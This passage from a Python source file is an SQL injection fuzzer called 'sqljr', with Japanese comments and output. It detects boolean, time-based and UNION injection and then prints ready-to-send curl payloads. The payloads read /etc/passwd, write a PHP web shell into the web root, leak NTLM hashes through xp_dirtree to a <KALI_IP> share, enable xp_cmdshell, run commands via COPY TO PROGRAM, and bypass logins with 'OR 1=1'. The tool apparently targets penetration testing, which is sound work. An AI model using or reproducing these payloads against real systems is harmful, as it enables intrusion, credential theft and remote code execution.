            continue
        ctx.bound = (pre, suf, op)
        ctx.tref = t1 if (op == "AND" and suf in ("", "-- -", "#")) else None
        ctx.hit("BOOL", true=mk(NUM_A, NUM_A), false=mk(NUM_A, NUM_A + 1), context="expression" if not op else op,
                evidence_true=evidence(t1), evidence_false=evidence(f1))
        print("  %s[BOOL  ]%s 真=%s (HTTP %d, %dB) / 偽=%s (HTTP %d, %dB) で応答差%s"
              % (G, N, repr(mk(NUM_A, NUM_A)), t1.status, len(t1.body), repr(mk(NUM_A, NUM_A + 1)), f1.status,
                 len(f1.body), "（式コンテキスト: ORDER BY / INSERT / UPDATE の可能性）" if not op else ""))
        if not ctx.dbms:        # エラーが出ない環境向け: DBMS 固有の真式で特定
            for name, expr in FINGERPRINTS:
                r = send(pt, cond_payload(pre, op, expr, suf))
                if not r.bad and not ctx.differ(r, t1) and ctx.differ(r, f1):
                    ctx.set_dbms(name)
                    print("  %s[DBMS  ]%s %s が真 → %s" % (G, N, expr, name))
                    break
        return


# ── 3) time-based ────────────────────────────────────
def hms(t):
    return "%d:%d:%d" % (t // 3600, t % 3600 // 60, t % 60)


def fmt_core(core, t):
    return core.format(t=t, hms=hms(t), al=ALIAS)


def time_bounds(ctx):
    if ctx.bound:
        return [ctx.bound]
    bs = [(p, "-- -" if p else "", "AND") for p in QUICK_PREFIXES if allow_comment() or not p]
    if ctx.quote:
        bs.sort(key=lambda b: not b[0].startswith(ctx.quote))
    if CFG.risk >= 2:
        bs += [(p, s, "OR") for p, s, _ in list(bs)]
    return bs


def time_candidates(ctx):
    """(dbms, 手法, t を受け取ってペイロードを返す関数, 境界) を優先順に返す。"""
    dbs = [ctx.dbms] if ctx.dbms in TIME_CORES else ([] if ctx.dbms else list(TIME_CORES))
    seen = set()

    def make(d, kind, core, pre, suf, op):
        if kind == "stack":
            # スタッククエリは MSSQL（WAITFOR が唯一の遅延手段）以外では --risk 2 のときだけ。
            # 末尾をコメントで消すので、コメントを送れない状況でも使わない
            if op == "" or not allow_comment() or not (d == "MSSQL" or CFG.risk >= 2):
                return None
            fn = lambda t: "%s%s-- -" % (pre, fmt_core(core, t))
            bound = (pre, "-- -", "AND")
        else:
            fn = lambda t: cond_payload(pre, op, fmt_core(core, t), suf)
            bound = (pre, suf, op)
        if fn(1) in seen:
            return None
        seen.add(fn(1))
        return d, kind, fn, bound

    for pre, suf, op in time_bounds(ctx):
        for d in dbs:
            for kind, core in TIME_CORES[d]:
                c = make(d, kind, core, pre, suf, op)
                if c:
                    yield c
    if not ctx.bound:           # INSERT / UPDATE の値や ORDER BY に埋め込む形
        for d in dbs:
            for pre, suf in TIME_EXPR_BOUNDS.get(d, []):
                for kind, core in TIME_CORES[d]:
                    if kind == "inline":
                        c = make(d, kind, core, pre, suf, "")
                        if c:
                            yield c


def test_time(ctx):
    pt, S = ctx.pt, CFG.sleep
    slow = lambda r: (not r.bad) and r.elapsed >= ctx.base_time + S * 0.8
    timeouts = 0
    for d, kind, fn, bound in time_candidates(ctx):
        r = send(pt, fn(S))
        if r.timeout:
            timeouts += 1
            continue
        if not slow(r):
            continue
        # 対照（0 秒）が速く、もう一度送って再び遅い → 確定
        c = send(pt, fn(0))
        if c.bad or c.elapsed >= ctx.base_time + S * 0.5:
            continue
        r2 = send(pt, fn(S))
        if not slow(r2):
            continue
        ctx.set_dbms(d)
        ctx.bound = ctx.bound or bound
        ctx.stack = ctx.stack or kind == "stack"
        ctx.hit("TIME", payload=fn(S), dbms=d, elapsed=round(r2.elapsed, 1), control_elapsed=round(c.elapsed, 1),
                stacked=(kind == "stack"), evidence=evidence(r2))
        print("  %s[TIME  ]%s %s → %.1fs 遅延 / 対照(0秒) %.1fs（%s%s）"
              % (G, N, repr(fn(S)), r2.elapsed, c.elapsed, d, "・スタッククエリ可" if kind == "stack" else ""))
        return
    # SQLite: sleep が無いので重い処理。サイズは小さい方から上げ、対照（サイズ 1）と比べる
    if ctx.dbms in (None, "SQLite"):
        bounds = time_bounds(ctx)
        if not ctx.bound:
            bounds = bounds + [(p, s, "") for p, s in TIME_EXPR_BOUNDS["SQLite"]]
        sizes = SQLITE_SIZES + ([300000000] if (ctx.dbms == "SQLite" or CFG.risk >= 2) else [])
        heavy = lambda r: (not r.bad) and r.elapsed >= ctx.base_time + 0.5
        for pre, suf, op in bounds:
            fn = lambda n: cond_payload(pre, op, SQLITE_HEAVY.format(n=n), suf)
            for size in sizes:
                r = send(pt, fn(size))
                if r.timeout:
                    timeouts += 1
                    break
                if not heavy(r):
                    continue
                c = send(pt, fn(1))
                if c.bad or c.elapsed >= ctx.base_time + 0.25 or not heavy(send(pt, fn(size))):
                    break
                ctx.set_dbms("SQLite")
                ctx.bound = ctx.bound or (pre, suf, op)
                ctx.hit("TIME", payload=fn(size), dbms="SQLite", elapsed=round(r.elapsed, 1),
                        control_elapsed=round(c.elapsed, 1), stacked=False, evidence=evidence(r))
                print("  %s[TIME  ]%s %s → %.1fs 遅延 / 対照 %.1fs（SQLite・重い処理）"
                      % (G, N, repr(fn(size)), r.elapsed, c.elapsed))
                return
    if timeouts:
        print("  %s[!] time 検査中に %d 回タイムアウト。遅延ではなく無応答なのでヒット扱いにしていません"
              "（--timeout を伸ばすか対象の状態を確認）。%s" % (Y, timeouts, N))


# ── 4) union-based（列数と表示列まで。抽出はしない）──
def concat_variants(dbms):
    a = "'%s'" % TAG
    if dbms == "MySQL":
        return ["CONCAT(" + a + ",'%s')"]
    if dbms == "MSSQL":
        return [a + "+'%s'"]
    if dbms in ("PostgreSQL", "Oracle", "SQLite"):
        return [a + "||'%s'"]
    return ["CONCAT(" + a + ",'%s')", a + "||'%s'"]


def union_cols_orderby(ctx, pre, cm):
    """ORDER BY n が通る最大の n（= 列数）。分からなければ None。"""
    order = lambda n: send(ctx.pt, "%s ORDER BY %d%s" % (pre, n, cm))
    r1 = order(1)
    # ORDER BY 1 は元（または boolean の真）と同じ応答、ORDER BY 9999 は別の応答になるはず
    if r1.bad or ctx.new_db(r1):
        return None
    if ctx.differ(r1, ctx.base) and not (ctx.tref and not ctx.differ(r1, ctx.tref)):
        return None
    rbig = order(9999)
    if rbig.bad or not (ctx.new_db(rbig) or ctx.differ(rbig, r1)):
        return None
    ok = lambda n: (lambda r: not r.bad and not ctx.new_db(r) and not ctx.differ(r, r1))(order(n))
    lo, hi, n = 1, None, 2
    while n <= 64:                      # 倍々で上限を探してから二分探索
        if ok(n):
            lo, n = n, n * 2
        else:
            hi = n
            break
    if hi is None:
        return None
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if ok(mid):
            lo = mid
        else:
            hi = mid
    return lo


def union_cols_nulls(ctx, pre, cm):
    """ORDER BY が使えないとき用: NULL の数を 1..12 で変え、1 つだけ応答が違う数を列数とする。"""
    frm = " FROM DUAL" if ctx.dbms == "Oracle" else ""
    sigs = {}
    for n in range(1, 13):
        r = send(ctx.pt, "%s UNION ALL SELECT %s%s%s" % (pre, ",".join(["NULL"] * n), frm, cm))
        if r.bad:
            return None
        sigs[n] = (r.fp[0], bool(ctx.new_db(r)), r.fp[2] if ctx.thr == 0 else len(r.body) // max(ctx.thr, 1))
    common, cnt = Counter(sigs.values()).most_common(1)[0]
    odd = [n for n, v in sigs.items() if v != common]
    return odd[0] if (cnt == 11 and len(odd) == 1) else None


def test_union(ctx):
    pt = ctx.pt
    if (ctx.bound and ctx.bound[2] == "") or not allow_comment():
        return          # 式コンテキスト（ORDER BY / INSERT 等）では使えない。コメント不可の状況でも送らない
    confirmed = ctx.bound is not None
    prefixes = [ctx.bound[0]] if confirmed else list(QUICK_PREFIXES)
    if ctx.quote and not confirmed:
        prefixes.sort(key=lambda p: not p.startswith(ctx.quote))
    comments = ["-- -"] + (["#"] if (ctx.dbms == "MySQL" or (confirmed and not ctx.dbms)) else [])
    pre = cm = cols = None
    how = "ORDER BY"
    for pre in prefixes:
        for cm in comments:
            cols = union_cols_orderby(ctx, pre, cm)
            if cols:
                break
        if cols:
            break
    if not cols and confirmed:              # 注入が確定しているときだけ、NULL を増やす方法も試す
        pre = prefixes[0]
        for cm in comments:
            cols = union_cols_nulls(ctx, pre, cm)
            if cols:
                how = "UNION SELECT NULL"
                break
    if not cols:
        return
    ctx.union = dict(pre=pre, cols=cols, vis=None, frm="", base=None, cm=cm)
    ctx.bound = ctx.bound or (pre, cm, "AND")

    # 表示される列を探す（文字列を入れられて、画面に出る列）
    froms = [" FROM DUAL"] if ctx.dbms == "Oracle" else ([""] + ([" FROM DUAL"] if not ctx.dbms else []))
    mark = lambda i: "%d%s" % (i, "kx")
    found = None
    for base in (null_base(pt), None):
        for frm in froms:
            for cv in concat_variants(ctx.dbms):
                # まず全列に目印（型が緩い DBMS ならこれ 1 回で分かる）。だめなら 1 列ずつ
                tries = [[cv % mark(i) for i in range(cols)]]
                if cols <= 16:
                    tries += [[(cv % mark(i)) if i == j else "NULL" for i in range(cols)] for j in range(cols)]
                for exprs in tries:
                    r = send(pt, "%s UNION ALL SELECT %s%s%s" % (pre, ",".join(exprs), frm, cm), base)
                    if r.bad or ctx.new_db(r):      # 型エラーの文面に目印が出ただけ、を表示列と誤認しない
                        continue
                    vis = [i for i in range(cols) if (TAG + mark(i)) in r.body]
                    if vis:
                        found = (vis[0], frm, base, r)
                        break
                if found:
                    break
            if found:
                break
        if found:
            break
    ev = None
    if found:
        ctx.union.update(vis=found[0], frm=found[1], base=found[2])
        ev = evidence(found[3])
        if found[1]:
            ctx.set_dbms("Oracle")
    ctx.hit("UNION", prefix=pre, comment=cm, columns=cols, visible=ctx.union["vis"], method=how, evidence=ev)
    msg = "列数 = %d（%s で判定）" % (cols, how)
    msg += (" / 表示列 = %d 列目" % (ctx.union["vis"] + 1)) if found else " / 表示列は自動では特定できず"
    print("  %s[UNION ]%s %s" % (G, N, msg))


# ── 提示するコマンド（もしかして これが刺さるかも？）──
def shq(s):
    """シェル用クォート。' を含むときは読みやすい "..." を優先する。"""
    if "'" in s and not re.search(r'[$`\\"!]', s):
        return '"%s"' % s
    return shlex.quote(s)


def curl_cmd(pt, payload, base=None):
    """人が編集しやすい形（--data-urlencode）で curl コマンドを作る。"""
    payload = tamper(payload)
    m = CFG.marker
    cl = lambda s: s.replace(m, "")
    w, key = pt["where"], pt["key"]
    val = (pt["pre"] if base is None else base) + payload + pt["post"]
    q = shq
    method, url, headers, body = build(pt, payload, base)
    parts = ["curl", "-sk", "-i"]
    simple_get = T.method == "GET" and T.kind is None
    if simple_get and T.query and w != "PATH":
        parts += ["-G", q(cl(T.url))]
        for i, (k, v) in enumerate(T.query):
            parts += ["--data-urlencode", q("%s=%s" % (k, val if (w == "GET" and i == key) else cl(v)))]
    else:
        if not (T.method == "GET" and body is None) and not (T.method == "POST" and body is not None):
            parts += ["-X", T.method]
        parts.append(q(url))
        if T.kind == "form":
            for i, (k, v) in enumerate(T.form):
                parts += ["--data-urlencode", q("%s=%s" % (k, val if (w == "POST" and i == key) else cl(v)))]
        elif body is not None:
            parts += ["--data-raw", q(body)]
    for k, v in headers.items():
        if k == "Cookie":
            parts += ["-b", q(v)]
        elif k.lower() == "content-type" and T.kind == "form":
            continue
        elif not (k == "User-Agent" and v == DEFAULT_UA):
            parts += ["-H", q("%s: %s" % (k, v))]
    return " ".join(parts)


def suggest(ctx):
    """検出結果から、次に手で試す価値のあるペイロードを (説明, ペイロード, base) で返す。"""
    pt, S = ctx.pt, CFG.sleep
    guessed = ctx.bound is None
    pre, suf, op = ctx.bound or ((ctx.quote or "'"), "-- -", "AND")
    known = ctx.dbms in INFO
    dlist = [ctx.dbms] if known else ["MySQL", "MSSQL", "PostgreSQL"]
    out = []
    u = ctx.union

    def union_pl(expr, d, tail=None):
        exprs = ["NULL"] * u["cols"]
        exprs[u["vis"]] = expr
        frm = " FROM DUAL" if d == "Oracle" else ""
        return "%s UNION ALL SELECT %s%s%s" % (u["pre"], ",".join(exprs), frm, tail if tail is not None else u["cm"])

    if u and u["vis"] is None:
        marks = ",".join("'c%d'" % (i + 1) for i in range(u["cols"]))
        out.append(("UNION: 列数は %d。画面に c1..c%d のどれが出るか確認（型エラーなら NULL に置換）"
                    % (u["cols"], u["cols"]),
                    "%s UNION ALL SELECT %s%s%s" % (u["pre"], marks, " FROM DUAL" if ctx.dbms == "Oracle" else "",
                                                    u["cm"]),
                    null_base(pt)))

    for d in dlist:
        I = INFO[d]
        tag = "" if known else "[%s なら] " % d
        steps = [("バージョン", I["ver"]), ("現在のユーザ", I["user"]), ("現在の DB", I["db"]),
                 ("テーブル一覧" + I.get("agg_note", ""), I["tables"]),
                 ("列一覧（<TABLE> を置換）", I["cols"]),
                 ("中身（<TABLE> <COL1> <COL2> を置換）", I["dump"])]
        if not known:
            steps = steps[:1]               # DBMS 不明のうちは、まず特定するための 1 手だけ
        if u and u["vis"] is not None:
            for title, qy in steps:
                out.append((tag + "UNION: " + title, union_pl("(%s)" % qy, d), u["base"]))
            if known and I.get("one"):
                out.append((tag + "UNION: テーブル名を 1 件ずつ（一覧が切れる / 集約関数が無いとき。<N> を 0,1,2… に）",
                            union_pl("(%s)" % I["one"], d), u["base"]))
        if "ERROR" in ctx.kinds and I["err"]:
            for title, qy in steps[:4]:
                out.append((tag + "error-based: %s をエラー文に出させる" % title,
                            cond_payload(pre, op, I["err"].format(q=qy), suf), None))
        probe = I["chr"].format(q=I["user"] if d != "SQLite" else I["tables"]) + ">77"
        if "BOOL" in ctx.kinds:
            out.append((tag + "boolean blind: 1 文字目が 'M'(77) より大きいか。真/偽の応答で判定し、"
                              "位置と数値を変えて二分探索",
                        cond_payload(pre, op, probe, suf), None))
        if "TIME" in ctx.kinds:
            kind, tmpl = I["timeb"]
            core = tmpl.format(cond=probe, t=S, hms=hms(S))
            pl = ("%s%s-- -" % (pre, core)) if kind == "stack" else cond_payload(pre, op, core, suf)
            out.append((tag + "time blind: 条件が真なら %d 秒遅延。位置と数値を変えて二分探索" % S, pl, None))

        if not known or op == "":
            continue
        # ── DBMS 別の「権限があれば」系 ──
        if d == "MySQL" and u and u["vis"] is not None:
            out.append(("MySQL: ファイル読み取り（FILE 権限があれば）",
                        union_pl("LOAD_FILE('/etc/passwd')", d), u["base"]))
            out.append(("MySQL: Web ルートに書き込み（secure_file_priv が空なら。パスは要調整）",
                        union_pl("'<?php system($_GET[\"c\"]);?>'", d, " INTO OUTFILE '/var/www/html/s.php'-- -"),
                        u["base"]))
        st = "" if ctx.stack else "【スタッククエリ未確認。効かなければ使えない】"
        if d == "MSSQL":
            out.append(("MSSQL: xp_dirtree で NTLM ハッシュを取得（Kali で responder / impacket-smbserver を待受）" + st,
                        "%s;EXEC master..xp_dirtree '\\\\<KALI_IP>\\share'-- -" % pre, None))
            out.append(("MSSQL: xp_cmdshell を有効化（sysadmin なら）" + st,
                        "%s;EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
                        "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -" % pre, None))
            out.append(("MSSQL: xp_cmdshell で実行確認（Kali で tcpdump -i tun0 icmp）" + st,
                        "%s;EXEC xp_cmdshell 'ping -n 2 <KALI_IP>'-- -" % pre, None))
        if d == "PostgreSQL":
            if u and u["vis"] is not None:
                out.append(("PostgreSQL: ファイル読み取り（superuser / pg_read_server_files なら）",
                            union_pl("pg_read_file('/etc/passwd')", d), u["base"]))
            out.append(("PostgreSQL: COPY TO PROGRAM でコマンド実行確認（superuser なら。Kali で tcpdump）" + st,
                        "%s;COPY (SELECT '') TO PROGRAM 'ping -c 2 <KALI_IP>'-- -" % pre, None))

    loginish = pt["where"] in ("POST", "JSON") and re.search(r"user|login|mail|name|pass|pwd", pt["name"], re.I)
    if op == "OR" or loginish:
        cm = suf if suf in ("-- -", "#") else "-- -"
        if op == "":                        # 式コンテキストで見つけた場合、閉じ方はクォートからの推測
            pre = ctx.quote or "'"
        out.append(("認証バイパス: 条件を常に真にする", "%s OR 1=1%s" % (pre, cm), None))
        if ctx.dbms == "Oracle":
            out.append(("認証バイパス: 先頭 1 行だけ返す（複数行でエラーになる実装向け）",
                        "%s OR 1=1 AND ROWNUM=1%s" % (pre, cm), None))
        elif ctx.dbms != "MSSQL":           # MSSQL は TOP が SELECT 側にしか書けないので注入では絞れない
            out.append(("認証バイパス: 先頭 1 行だけ返す（複数行でエラーになる実装向け）",
                        "%s OR 1=1 LIMIT 1%s" % (pre, cm), None))
        if re.search(r"user|login|mail|name", pt["name"], re.I):
            out.append(("認証バイパス: admin としてパスワード判定をコメントアウト", "%s%s" % (pre, cm), "admin"))
    return out, guessed, known


def print_suggestions(ctx):
    sug, guessed, known = suggest(ctx)
    if not sug:
        return []
    pre, suf, op = ctx.bound or ((ctx.quote or "'"), "-- -", "AND")
    bd = "数値コンテキスト（閉じ不要）" if not pre and not suf else "%s … %s" % (repr(pre), repr(suf))
    if op == "":
        bd += "（式コンテキスト）"
    print("\n  %s[?] もしかして これが刺さるかも？%s  DBMS: %s / 境界: %s%s"
          % (M, N, ctx.dbms if known else "不明（候補ごとに表示）", bd,
             "（推測。boolean で未確定）" if guessed else ""))
    res = []
    for i, (title, payload, base) in enumerate(sug, 1):
        shown = tamper(payload)             # 「値」も「コマンド」も実際に送る形（tamper 適用後）
        value = (ctx.pt["pre"] if base is None else base) + shown + ctx.pt["post"]
        if ctx.pt["where"] in ("PATH", "BODY"):
            value = shown
        cmd = curl_cmd(ctx.pt, payload, base)
        print("   %s%2d) %s%s" % (C, i, title, N))
        print("       値      : %s" % value)
        print("       コマンド: %s" % cmd)
        res.append(dict(title=title, value=value, command=cmd))
    return res


# ── 出力 ─────────────────────────────────────────────
def banner(point):
    print("\n%s[*] 注入点: %s '%s'  (元値: %s)%s"
          % (C, point["where"], point["name"], point["pre"] if point["where"] != "PATH" else "(URL パス)", N))


def main():
    global SESSION, T

    ap = argparse.ArgumentParser(add_help=False,
        description="SQL injection 注入点ファザー（検出 + 次に打つコマンドの提示まで。dump はしない）")
    ap.add_argument("-u", "-h", "--url", dest="url", default=None,
                    help="対象 URL（例: http://victim/item?id=1、* で注入点を固定）")
    ap.add_argument("-r", "--request", default=None, help="Burp 等の生リクエストファイル")
    ap.add_argument("--https", action="store_true", help="-r のとき https で送る")
    ap.add_argument("-m", "--method", default=None, help="HTTP メソッド（既定: -d があれば POST）")
    ap.add_argument("-d", "--data", default=None, help="ボディ（user=a&pass=b / JSON / * 付きの生データ）")
    ap.add_argument("-p", "--param", default=None, help="このパラメータだけ狙う")
    ap.add_argument("-c", "--cookie", default=None, help="Cookie（key=val; key2=val2）")
    ap.add_argument("-H", "--header", action="append", help="追加ヘッダ（複数可）例: -H 'Authorization: Bearer x'")
    ap.add_argument("-t", "--technique", default="EBTU",
                    help="使う手法: E=error B=boolean T=time U=union（既定 EBTU）")
    ap.add_argument("--dbms", default=None, help="DBMS を固定（mysql/mssql/postgresql/oracle/sqlite）")
    ap.add_argument("--level", type=int, default=1, help="1=パラメータ 2=+Cookie 3=+ヘッダ(UA/Referer/XFF)（既定 1）")
    ap.add_argument("--risk", type=int, default=1,
                    help="1=AND と式埋め込み。GET 以外ではコメント(-- -)/UNION/WAITFOR を送らない（既定） "
                         "2=全部送る: +OR 型・スタッククエリ・GET 以外でのコメント・SQLite の大きい負荷"
                         "（書き込み系の SQL だとデータを壊し得る）")
    ap.add_argument("--string", default=None, help="boolean 判定: 真のときだけ応答に出る文字列")
    ap.add_argument("--sleep", type=int, default=5, help="time-based の遅延秒（既定 5）")
    ap.add_argument("--marker", default="*", help="注入点マーカー（既定 *）")
    ap.add_argument("--timeout", type=int, default=20, help="リクエストのタイムアウト秒")
    ap.add_argument("--delay", type=float, default=0, help="リクエスト間の待ち秒")
    ap.add_argument("--retries", type=int, default=1, help="通信エラー時の再送回数（既定 1）")
    ap.add_argument("--proxy", default=None, help="プロキシ（例: http://127.0.0.1:8080 で Burp に通す）")
    ap.add_argument("--tamper", default="", help="カンマ区切り: " + ",".join(TAMPERS))
    ap.add_argument("-o", "--output", default=None, help="結果を JSON で保存（検出の根拠になったリクエスト/応答つき）")
    ap.add_argument("--log", default=None, help="送った全リクエストを JSONL で保存（証跡用）")
    ap.add_argument("-v", "--verbose", action="store_true", help="送った全リクエストを表示")
    ap.add_argument("--help", action="help", help="このヘルプを表示")
    args = ap.parse_args()

    CFG.sleep = max(1, args.sleep)
    CFG.timeout = max(args.timeout, CFG.sleep + 15)
    CFG.marker, CFG.delay, CFG.retries = args.marker, args.delay, max(0, args.retries)
    CFG.risk, CFG.level, CFG.string, CFG.verbose = args.risk, args.level, args.string, args.verbose
    CFG.tamper = [x.strip() for x in args.tamper.split(",") if x.strip()]
    for name in CFG.tamper:
        if name not in TAMPERS:
            sys.exit("[!] 不明な tamper: %s（使えるもの: %s）" % (name, ", ".join(TAMPERS)))
    if args.dbms:
        alias = {"mysql": "MySQL", "mariadb": "MySQL", "mssql": "MSSQL", "sqlserver": "MSSQL",
                 "postgresql": "PostgreSQL", "postgres": "PostgreSQL", "pgsql": "PostgreSQL",
                 "oracle": "Oracle", "sqlite": "SQLite"}
        CFG.dbms = alias.get(args.dbms.lower())
        if not CFG.dbms:
            sys.exit("[!] 不明な DBMS: %s" % args.dbms)
    tech = args.technique.upper()

    if args.log:
        CFG.log = open(args.log, "a", encoding="utf-8")
    SESSION = requests.Session()
    if args.proxy:
        SESSION.proxies = {"http": args.proxy, "https": args.proxy}
    T = build_target(args)
    points = build_points(T, args.param)
    if not points:
        sys.exit("[!] 注入点が見つかりません。パラメータの有無、* の位置、--level（Cookie=2 / ヘッダ=3）を確認してください。")

    print("%s=== sqljr — %s %s — %d 個の注入点を検査（手法: %s, sleep=%ds, risk=%d）===%s"
          % (B, T.method, T.url.replace(CFG.marker, ""), len(points), tech, CFG.sleep, CFG.risk, N))
    if CFG.risk >= 2:
        print("%s[!] --risk 2: OR 型とスタッククエリを送ります。UPDATE / DELETE に届くと全行に効き得ます。%s" % (R, N))
    elif T.method not in ("GET", "HEAD"):
        print("%s[i] %s リクエストなので、後続の SQL をコメントで消すペイロード（-- - / UNION / WAITFOR）は送りません"
              "（UPDATE や DELETE の WHERE が消えるのを避けるため）。\n    検索・ログインなど参照系と分かっているなら "
              "--risk 2 で全ペイロードを送れます。登録・更新系は検査のたびに行が書き込まれます。%s" % (Y, T.method, N))
    results = []

    for pt in points:
        banner(pt)
        ctx = Ctx(pt)
        blocked0 = CFG.blocked
        if not baseline(ctx):
            continue
        if "E" in tech:
            test_error(ctx)
        if "B" in tech:
            test_boolean(ctx)
        if "T" in tech:
            test_time(ctx)
        if "U" in tech:
            test_union(ctx)

        # 検査中に対象の状態が変わっていないか（セッション切れ / WAF による遮断）
        blocked = CFG.blocked - blocked0
        if blocked and ctx.base.status not in WAF_STATUS:
            print("  %s[!] %d 件が HTTP 403/406/429/503。WAF かレート制限の可能性。この注入点の「検出なし」は"
                  "信用できません（--delay / --tamper / --proxy で確認）。%s" % (Y, blocked, N))
        again = send(pt, "")
        if again.bad or ctx.differ(again, ctx.base):
            print("  %s[!] 検査後、元のリクエストの応答が最初と変わっています（セッション切れ / 遮断 / データ変化）。"
                  "この注入点の結果は取り直してください。%s" % (Y, N))
        if ctx.kinds and "BOOL" not in ctx.kinds and CFG.risk < 2 and "B" in tech:
            print("  %s[i] boolean は未検出。元値が無効な入力（ログインフォーム等）なら --risk 2 で OR 型を試せます。%s"
                  % (Y, N))
        if ctx.kinds and not allow_comment() and "U" in tech:
            print("  %s[i] UNION と MSSQL の WAITFOR は未実施（コメントで後続を消すため）。参照系なら --risk 2 で再実行。%s"
                  % (Y, N))

        sug = []
        if not ctx.kinds:
            print("  %s[-]%s この注入点では検出なし" % (Y, N))
        else:
            sug = print_suggestions(ctx)
        results.append(dict(where=pt["where"], name=pt["name"], base_value=pt["pre"],
                            vulnerable=bool(ctx.kinds), techniques=sorted(ctx.kinds), dbms=ctx.dbms,
                            boundary=(dict(prefix=ctx.bound[0], suffix=ctx.bound[1], op=ctx.bound[2])
                                      if ctx.bound else None),
                            stacked=ctx.stack, union=ctx.union, hits=ctx.hits, suggestions=sug))

    print()
    if any(r["vulnerable"] for r in results):
        print("%s[+] 注入点あり（送信 %d リクエスト）。上のコマンドは提示のみで、ツールは実行していません。%s"
              % (G, CFG.count, N))
        print("    QUOTE だけの検出は「可能性」です。提示コマンドで手動確認してください。")
    else:
        print("%s[-] 検出なし（送信 %d リクエスト）。%s" % (Y, CFG.count, N))
        print("    次の一手: --risk 2（OR 型・スタッククエリ。ログインフォーム向け）、--level 2/3（Cookie・ヘッダ）、"
              "--tamper space2comment,randomcase、--string、-r で Burp のリクエストをそのまま渡す")
        print("    未対応: 二次 SQLi、base64 等で包まれた値、multipart（* を置いた箇所のみ）。検出なし＝安全ではありません。")
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(dict(target=T.url.replace(CFG.marker, ""), method=T.method, requests=CFG.count,
                           points=results), f, ensure_ascii=False, indent=2)
        print("[i] 結果を保存: %s" % args.output)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[!] 中断")
